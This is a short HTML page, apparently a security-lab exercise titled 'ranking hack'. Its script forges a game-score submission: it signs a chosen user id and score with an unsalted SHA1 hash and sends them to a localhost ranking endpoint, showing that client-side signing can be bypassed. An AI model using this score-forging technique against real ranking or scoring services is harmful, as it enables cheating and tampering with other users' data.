<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>ランキングHack</title>
</head>
<body>

<script src="../js/jquery.min.js"></script>
<script src="../js/sha1.js"></script>
<script>
$(document).ready(function(){
	var userid = "U00001";
	var score  = 8888;
	var sign   = CybozuLabs.SHA1.calc(userid+score);
	
	var url =   "http://localhost:8080/security/ranking1/receive.php"
			  + "?userid=" + userid
			  + "&score="  + score
			  + "&sign="   + sign;
	console.log(url);

	$.ajax(
	  url
	 ,{
	    dataType: "json"
	  , method: "GET"
	})
	.done(function(data){
		console.log(data);
	});
});
</script>
</body>
</html>
